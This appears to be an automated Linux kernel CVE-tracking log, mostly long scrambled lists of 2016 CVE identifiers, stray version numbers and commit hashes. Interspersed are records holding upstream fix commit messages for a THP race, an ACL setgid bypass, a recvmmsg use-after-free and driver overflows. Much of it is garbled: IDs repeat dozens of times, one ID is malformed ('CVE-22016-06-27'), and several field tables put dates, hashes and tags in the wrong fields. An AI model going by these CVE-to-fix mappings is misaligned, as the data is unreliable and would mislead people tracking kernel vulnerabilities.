CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2012-09-28:
CVE-2016-8666:
2016-09-07:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.2:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.8:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-22016-06-27:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
3.15:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
ff19f63ed47309550b47831ac39176d9910fadfe:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2016-07-08:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
1a1a143daf84db95dd7212086042004a3abb7bc2:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
*************

*** This is a new CVE ***
This CVE has been resolved in 09a2499466dc69d1e54e8e879d4591cdd0ca17c8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Author: Andrea Arcangeli <aarcange@redhat.com>
Date:   Fri Feb 26 15:19:28 2016 -0800

    mm: thp: fix SMP race condition between THP page fault and MADV_DONTNEED
    
    commit ad33bb04b2a6cee6c1f99fabb15cddbf93ff0433 upstream.
    
    pmd_trans_unstable()/pmd_none_or_trans_huge_or_clear_bad() were
    introduced to locklessy (but atomically) detect when a pmd is a regular
    (stable) pmd or when the pmd is unstable and can infinitely transition
    from pmd_none() and pmd_trans_huge() from under us, while only holding
    the mmap_sem for reading (for writing not).
    
    While holding the mmap_sem only for reading, MADV_DONTNEED can run from
    under us and so before we can assume the pmd to be a regular stable pmd
    we need to compare it against pmd_none() and pmd_trans_huge() in an
    atomic way, with pmd_trans_unstable().  The old pmd_trans_huge() left a
    tiny window for a race.
    
    Useful applications are unlikely to notice the difference as doing
    MADV_DONTNEED concurrently with a page fault would lead to undefined
    behavior.
    
    [js] 3.12 backport: no pmd_devmap in 3.12 yet.
    
    [akpm@linux-foundation.org: tidy up comment grammar/layout]
    Signed-off-by: Andrea Arcangeli <aarcange@redhat.com>
    Reported-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Vlastimil Babka <vbabka@suse.cz>
    Signed-off-by: Jiri Slaby <jslaby@suse.cz>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 mm/memory.c |   14 ++++++++++++--
 1 file changed, 12 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: -
CVE: 2016-09-11
Break Date: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Break Commit: 3.14.79
Break Tag: -
Linus Fix Date: 2016-09-11
Linus Commit: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Linus Tag: 3.14.79
Stable Date: -
Stable Commit: 2016-09-11
Stable Tag: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
CVE-2013-4312:
CVE-2013-7421:
CVE-2013-7421:
CVE-2013-7446:
CVE-2014-0155:
CVE-2014-0181:
CVE-2014-0196:
CVE-2014-0206:
CVE-2014-1737:
CVE-2014-1738:
CVE-2014-1739:
CVE-2014-2580:
CVE-2014-2678:
CVE-2014-2739:
CVE-2014-2851:
CVE-2014-3122:
CVE-2014-3144:
CVE-2014-3145:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3181:
CVE-2014-3182:
CVE-2014-3183:
CVE-2014-3184:
CVE-2014-3185:
CVE-2014-3186:
CVE-2014-3534:
CVE-2014-3601:
CVE-2014-3610:
CVE-2014-3611:
CVE-2014-3631:
CVE-2014-3646:
CVE-2014-3647:
CVE-2014-3647:
CVE-2014-3673:
CVE-2014-3687:
CVE-2014-3688:
CVE-2014-3690:
CVE-2014-3917:
CVE-2014-3940:
CVE-2014-4014:
CVE-2014-4157:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4508:
CVE-2014-4608:
CVE-2014-4608:
CVE-2014-4611:
CVE-2014-4652:
CVE-2014-4653:
CVE-2014-4654:
CVE-2014-4655:
CVE-2014-4656:
CVE-2014-4656:
CVE-2014-4667:
CVE-2014-4699:
CVE-2014-4943:
CVE-2014-5045:
CVE-2014-5077:
CVE-2014-5206:
CVE-2014-5206:
CVE-2014-5207:
CVE-2014-5207:
CVE-2014-5471:
CVE-2014-5472:
CVE-2014-6410:
CVE-2014-6416:
CVE-2014-6417:
CVE-2014-6418:
CVE-2014-7145:
